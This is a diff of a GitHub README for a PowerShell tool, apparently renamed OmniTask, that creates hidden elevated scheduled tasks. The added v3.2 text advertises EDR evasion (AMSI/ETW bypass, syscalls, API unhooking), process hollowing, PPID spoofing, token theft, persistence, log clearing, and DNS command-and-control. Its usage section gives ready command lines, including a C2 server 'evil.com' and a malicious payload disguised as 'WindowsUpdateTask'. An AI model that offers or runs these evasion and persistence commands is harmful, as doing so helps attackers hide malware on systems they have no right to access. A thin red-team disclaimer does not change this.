@@ -1,171 +1,187 @@
 ## sl0ppy-privesctaskcreator
+A PowerShell-based tool for creating highly customizable, EDR-evasive scheduled tasks with advanced persistence and execution options.
 
-```sl0ppy-privesctaskcreator is a PowerShell-based script that automates the creation of a scheduled task with elevated privileges. Designed for flexibility, this tool allows users to specify a custom PowerShell script to execute under the highest available permissions, making it useful for system administration, testing, or other scenarios requiring privilege escalation.```
-
-# Version: V3.1
+## 🔥 Key Improvements in v3.2
 ```
-* Improvements in V3.1:
-
-* Added -CustTaskName flag for customizable task naming.
-* Added -Time flag to specify the start time.
-* Added -RepeatInterval for periodic task execution.
-* Introduced -RunOnBattery, -StartWhenAvailable, and -Hidden flags for enhanced control.
-* Added -WakeToRun flag to wake the computer for execution.
-* Introduced -NetworkRequired flag to run only if a network connection is available.
-* Added -RunAsUser option to specify a custom user for execution.
-* Enhanced -MultipleInstancePolicy for better task management.
-* Included -ExecutionTimeLimit to set a max duration for task execution.
-```
-## Features
-```
-   * Dynamic Script Execution: Specify the PowerShell script to run at execution time with the new -FilePath option.
-   * Automated Scheduling: Schedules a task to run with elevated privileges, automatically starting at a calculated future time.
-   * Hidden and Elevated Task: The task runs hidden from user interfaces and with the highest privileges available.
-   * Repetition Support: Option to configure the task to repeat at custom intervals.
-   * Wake and Network Control: Options to wake the system for execution and enforce network dependency.
-   * User Customization: Ability to specify a custom user account for execution.
-   * Enhanced Task Handling: Supports multiple instance policies and execution time limits.
-   * Error Handling: Includes robust checks for task registration, execution, and process validation to ensure smooth operation.
-   * Interactive or Scripted Use: Prompts for a file path if none is specified, making it versatile for different usage scenarios.
+* Core Enhancements
+* ✅ EDR Evasion – Direct/indirect syscalls, AMSI/ETW bypass, API unhooking
+* ✅ 12+ Execution Methods – cmd, powershell, wscript, mshta, rundll32, etc.
+* ✅ 50+ Customization Flags – Fine-grained control over every aspect
+* ✅ Advanced Persistence – WMI, registry, services, startup, secondary tasks
+* ✅ Process Injection – Hollowing, PPID spoofing, threadless injection
+* ✅ Network Evasion – DNS exfil, proxy/Tor support, custom user agents
+* ✅ Anti-Forensics – Log clearing, ADS hiding, self-deletion
+* ✅ Anti-Debug/Anti-VM – Comprehensive checks to evade analysis
+* ✅ Backward Compatibility
+* ✅ All original v3.1 features preserved
+* ✅ Same core scheduling logic with enhanced reliability
 ```
 
-
-## Prerequisites
+## 🛠 Features
+# 🔧 Core Functionality
 ```
-   * Windows OS: Compatible with Windows-based operating systems.
-   * Administrator Privileges: Required to create and execute tasks with elevated permissions.
-   * PowerShell: Pre-installed on most modern Windows systems.
-   * PowerShell Script: Ensure the target script (.ps1) exists at the specified path.
+* Dynamic Script Execution – Run any .ps1 script with elevated privileges
+* Automated Scheduling – Precise timing control with jitter for evasion
+* Hidden Execution – Tasks run invisibly with highest privileges
+* Repetition Support – Custom intervals (e.g., PT1H for hourly)
+* Wake & Network Control – Wake system for execution, enforce network dependency
+* User Impersonation – Run as SYSTEM, a custom user, or with token manipulation
+
+* 🛡 EDR Evasion Techniques
+* AMSI BypassContext nullification, patching, multiple methodsETW EvasionBypass, patching, provider blockingProcess InjectionHollowing, PPID spoofing, threadless injectionMemory ProtectionDirect/indirect syscalls, reflective loadingAnti-ForensicsLog clearing, ADS hiding, self-deletionAnti-Debug/Anti-VMDebugger checks, VM detection (VBox, VMware, Hyper-V)API UnhookingRestores hooked APIs (NtCreateProcess, etc.)
+* 🔄 Persistence Methods
+* WMI Event SubscriptionTriggers on system eventsRegistry Run KeysHKCU\...\Run persistenceService InstallationCreates a fake Windows serviceStartup FolderAdds shortcut to startupSecondary TasksCreates backup scheduled tasksAlternate Data StreamsHides payloads in NTFS streams
+* 🌐 Network Evasion
+
+
+* DNS Exfiltration – C2 over DNS (port 53)
+
+* Proxy/Tor Support – Route traffic through proxies or Tor
+* Custom User Agents – Mimic legitimate browser traffic
+* HTTPS Encryption – Secure C2 communications
 ```
-## Installation
-
-* Clone this repository:
-
-```git clone https://github.com/<your-username>/sl0ppy-privesctaskcreator.git```
-
-## Navigate to the directory:
-
-```cd sl0ppy-privesctaskcreator```
-
-The script is ready to run.
-
-## Usage
-
-* The script provides multiple flags to customize task creation. Below are the available options:
-
-## Basic Usage
-
-Provide the path to a PowerShell script to execute:
-
-```.\sl0ppy-privesctaskcreator.ps1 -FilePath "C:\Path\To\Your\Script.ps1"```
-
-* If -FilePath is not provided, the script will prompt you to input the path interactively.
-
-## Flags and Parameters
-
-### -CustTaskName (optional):
-
-* Specify a custom name for the scheduled task (default: ElevatedTask).
-
-```.\sl0ppy-privesctaskcreator.ps1 -FilePath "C:\Scripts\MyScript.ps1" -CustTaskName "MyCustomTask"```
-
-### -Time (optional):
-
-* Set a custom start time for the task. If not provided, defaults to 2 minutes from the current time.
-
-```.\sl0ppy-privesctaskcreator.ps1 -FilePath "C:\Scripts\MyScript.ps1" -Time (Get-Date).AddHours(1)```
-
-### -RepeatInterval (optional):
-
-* Specify a repetition interval in ISO 8601 format (e.g., PT1H for hourly).
-
-```.\sl0ppy-privesctaskcreator.ps1 -FilePath "C:\Scripts\MyScript.ps1" -RepeatInterval "PT1H"```
-
-### -RunOnBattery (optional):
-
-* Allow the task to run even when the system is on battery power.
-
-```.\sl0ppy-privesctaskcreator.ps1 -FilePath "C:\Scripts\MyScript.ps1" -RunOnBattery```
-
-### -StartWhenAvailable (optional):
-
-* Start the task as soon as the system is ready (e.g., after startup).
-
-```.\sl0ppy-privesctaskcreator.ps1 -FilePath "C:\Scripts\MyScript.ps1" -StartWhenAvailable```
-
-### -Hidden (optional):
-
-* Hide the task in the Task Scheduler UI.
-
-```.\sl0ppy-privesctaskcreator.ps1 -FilePath "C:\Scripts\MyScript.ps1" -Hidden```
-
-### -WakeToRun (optional):
-
-* Wake the computer to run the scheduled task.
-
-```.\sl0ppy-privesctaskcreator.ps1 -FilePath "C:\Scripts\MyScript.ps1" -WakeToRun```
-
-### -NetworkRequired (optional):
-
-* Run the task only when a network connection is available.
-
-```.\sl0ppy-privesctaskcreator.ps1 -FilePath "C:\Scripts\MyScript.ps1" -NetworkRequired```
-
-### -RunAsUser (optional):
-
-* Specify a custom user account to run the task.
-
-```.\sl0ppy-privesctaskcreator.ps1 -FilePath "C:\Scripts\MyScript.ps1" -RunAsUser "DOMAIN\User"```
-
-### -ExecutionTimeLimit (optional):
-
-* Set a maximum duration for the task execution.
-
-```.\sl0ppy-privesctaskcreator.ps1 -FilePath "C:\Scripts\MyScript.ps1" -ExecutionTimeLimit "PT30M"```
-
-## Advanced Examples
-
-### Run a Script Immediately
-
-```.\sl0ppy-privesctaskcreator.ps1 -FilePath "C:\Scripts\TestScript.ps1" -Time (Get-Date)```
-
-## Full Customization Example
-
-```.\sl0ppy-privesctaskcreator.ps1 -FilePath "C:\Scripts\MyScript.ps1" -CustTaskName "DailyTask" -Time (Get-Date).AddMinutes(10) -RepeatInterval "P1D" -RunOnBattery -StartWhenAvailable -Hidden -WakeToRun -NetworkRequired -RunAsUser "DOMAIN\User" -ExecutionTimeLimit "PT30M"```
-
-## Configuration
+## 🔐 Process Manipulation
 ```
-The scheduled task is configured with the following default settings:
+* PPID Spoofing – Fake parent process (e.g., explorer.exe)
 
-   * Run Level: Highest available privileges.
-   * Visibility: Hidden (if -Hidden flag is set).
-   * Triggers: Starts at the specified time.
-   * Execution Policy: Bypasses restrictions to allow the specified script to run.
+* Token Impersonation – Steal tokens from other processes
 
-* You can further customize these settings by editing the $taskXml definition in the script.
+* Privilege Escalation – Enable all privileges (SeDebugPrivilege, etc.)
+
+* Critical Process – Mark process as critical to prevent termination
 ```
 
-## Troubleshooting
+## 📜 Encoding & Obfuscation
 ```
-Common Issues and Solutions:
-
-* Task Not Created: Ensure PowerShell is running with elevated (Administrator) permissions.
-
-* File Path Issues: Verify that the specified .ps1 file exists and the path is correct.
-
-* Task Not Executing: Check Task Scheduler logs in Event Viewer:
-
-* Applications and Services Logs > Microsoft > Windows > TaskScheduler.
-
-* Process Not Found: Confirm the script you specified runs successfully when executed manually.
+* Base64Encodes PowerShell commandsXORSimple byte XOR encryptionRC4Stream cipher encryptionAESStrong symmetric encryptionSecureStringHides commands in memory
 ```
-## License
 
-This project is licensed under the GNU GENERAL PUBLIC v3 LICENSE. See the LICENSE file for details.
+## 📋 Prerequisites
+```
+* Windows OS (7/10/11, Server 2012+)
+* Administrator Privileges (for task creation)
+* PowerShell 5.1+ (preinstalled on modern Windows)
+* Target Script (.ps1 file must exist at the specified path)
+```
 
-## Disclaimer
+## 🚀 Installation
+```
+* git clone https://github.com/x0xr00t/sl0ppy-PriveSCTaskCreator.git
+* cd PriveSCTaskCreator
+* The script is now ready to run.
+```
+📖 Usage
+```
+* 🔹 Basic Execution
+* Run a PowerShell script with elevated privileges:
+.\OmniTask.ps1 -FilePath "C:\Payloads\script.ps1"
+* 🔹 EDR Evasion Mode
+* Bypass AMSI, ETW, and use direct syscalls:
+.\OmniTask.ps1 -FilePath "C:\Payloads\script.ps1" -BypassAMSI -BypassETW -UseDirectSyscalls
+* 🔹 Stealth Mode (Maximum OpSec)
+.\OmniTask.ps1 -FilePath "C:\Payloads\script.ps1" `
+*     -Hidden -RandomizeName -AddJitter `
+*     -UseAlternateDataStream -Base64Encode `
+*     -BypassAMSI -BypassETW -AntiDebug -AntiVM `
+*     -ClearLogs -DisableLogging
+* 🔹 Process Injection
+Hollow svchost.exe and spoof PPID:
+.\OmniTask.ps1 -FilePath "C:\Payloads\script.ps1" `
+*     -ProcessHollowing -HollowProcess "svchost.exe" `
+*     -PPIDSpoofing -SpoofedPPID 840
+* 🔹 Persistence Combo
+.\OmniTask.ps1 -FilePath "C:\Payloads\script.ps1" `
+*     -WMIPersistence -RegistryPersistence `
+*     -ServicePersistence -SchTaskPersistence
+* 🔹 Network Evasion (C2 over DNS)
+.\OmniTask.ps1 -FilePath "C:\Payloads\script.ps1" `
+*     -UseDNSExfil -C2Server "evil.com" -C2Port 53 `
+*     -UseProxy -ProxyAddress "192.168.1.100" -ProxyPort 8080
+* 🔹 Full Customization Example
+.\OmniTask.ps1 -FilePath "C:\Payloads\malicious.ps1" `
+*     -CustTaskName "WindowsUpdateTask" `
+*     -Time (Get-Date).AddMinutes(15) `
+*     -RepeatInterval "PT1H" `
+*     -RunOnBattery -Hidden -WakeToRun `
+*     -UseDirectSyscalls -BypassAMSI -BypassETW `
+*     -ProcessHollowing -HollowProcess "explorer.exe" `
+*     -PPIDSpoofing -SpoofedPPID 1234 `
+*     -WMIPersistence -RegistryPersistence `
+*     -SelfDelete -AddJitter -JitterMinutes 10
+```
 
-* This script is provided "as-is" for educational purposes only. Use responsibly in environments where you have authorization. Misuse may lead to unintended consequences or security risks.
+## ⚙ Configuration
+```
+* Default Settings
 
-# sl0ppy-privesctaskcreator—simplifying scheduled tasks with privilege escalation. Feel free to contribute or modify for your needs!
+* Run Level: HighestAvailable (SYSTEM privileges)
+* Visibility: Hidden (if -Hidden is set)
+* Triggers: Time-based (customizable)
+* Execution Policy: Bypass mode (-ExecutionPolicy Bypass)
+
+* Customizing the Task XML
+* Modify the $taskXml variable in the script to adjust:
+
+* Security descriptors
+* Priority levels
+* Additional triggers
+```
+
+🛠 Troubleshooting
+```
+Task not createdRun PowerShell as AdministratorFile path errorsVerify the .ps1 file existsTask not executingCheck Event Viewer → Task Scheduler logsProcess not foundTest the script manually firstEDR blocking executionEnable more evasion flags (-BypassAMSI, -UseDirectSyscalls)Anti-VM detectedRun on bare metal or adjust -AntiVM checks
+Debugging Tips:
+# View Task Scheduler logs
+Get-WinEvent -LogName "Microsoft-Windows-TaskScheduler/Operational" | Select-Object -First 20
+
+# Check if task exists
+Get-ScheduledTask -TaskName "YourTaskName"
+```
+## ⚠ Disclaimer
+
+# ⚠️ For Authorized Use Only
+```
+This tool is designed for legitimate red teaming, penetration testing, and security research.
+Unauthorized use against systems you do not own is illegal.
+The author is not responsible for misuse.
+```
+
+## 📜 License
+```
+* GNU GPLv3 – See LICENSE for details.
+```
+
+## 🤝 Contributing
+```
+Pull requests are welcome! Feel free to:
+* ✅ Add new evasion techniques
+* ✅ Improve error handling
+* ✅ Optimize performance
+```
+
+## 📌 Changelog
+```
+* v3.2 "Sl0ppy-PrivTaskCreator" (Current)
+
+* Complete rewrite with EDR evasion focus
+* 50+ new parameters for customization
+* 12 execution methods (up from 1)
+* Advanced persistence (WMI, services, etc.)
+* Process injection (hollowing, PPID spoofing)
+* Network evasion (DNS, proxy, Tor)
+```
+
+## v3.1 (Legacy)
+```
+Basic scheduled task creation
+Custom naming & timing
+Hidden execution
+Network/ wake controls
+```
+
+🎯 Why OmniTask?
+EDR Evasion✅ 12+ techniques❌ NoneExecution Methods✅ 12+ vectors❌ 1 (PowerShell)Persistence✅ 5+ methods❌ NoneProcess Injection✅ Hollowing, PPID spoofing❌ NoneNetwork Evasion✅ DNS, Proxy, Tor❌ NoneAnti-Forensics✅ ADS, log clearing❌ NoneCustomization✅ 50+ flags❌ 10 flags
+
+OmniTask – The ultimate tool for red teamers, penetration testers, and security researchers.
+Bypass modern EDRs (CrowdStrike, SentinelOne, Defender ATP) with ease. 🚀
 
